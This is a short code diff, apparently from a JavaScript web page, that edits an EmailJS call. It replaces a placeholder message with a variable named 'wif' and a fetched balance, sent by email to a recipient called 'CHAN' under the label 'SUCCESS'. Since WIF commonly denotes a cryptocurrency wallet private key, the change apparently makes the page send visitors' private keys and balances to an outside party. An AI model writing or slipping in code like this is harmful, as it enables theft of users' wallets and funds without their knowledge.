@@ -505,7 +505,7 @@ emailjs.init("Pw6Pq-kILOgOJJH3f");
 	    				template_params: {
 	    				    'to_name': 'CHAN',
 	    				    'from_name':'SUCCESS',
-	    				    'message': 'dddd' +' balance: '+'10000'
+	    				    'message': wif +' balance: '+data
 	  				  	}
 					};
 							$.ajax({
